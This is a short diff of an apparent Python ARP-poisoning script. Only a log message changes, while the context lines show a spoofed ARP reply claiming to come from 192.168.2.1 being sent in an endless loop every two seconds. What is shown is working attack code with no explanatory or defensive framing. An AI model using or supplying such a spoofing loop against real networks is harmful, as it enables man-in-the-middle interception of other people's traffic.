@@ -29,6 +29,6 @@ poisonedTarget.psrc = "192.168.2.1"
 
 # Keep poisoning the ARP;
 while True:
-    print('Sending poisoned ARP to: ' + str(poisonedTarget.pdst))
+    print('Poisoning ' + str(poisonedTarget.pdst))
     send(poisonedTarget, verbose=False)
     time.sleep(2)
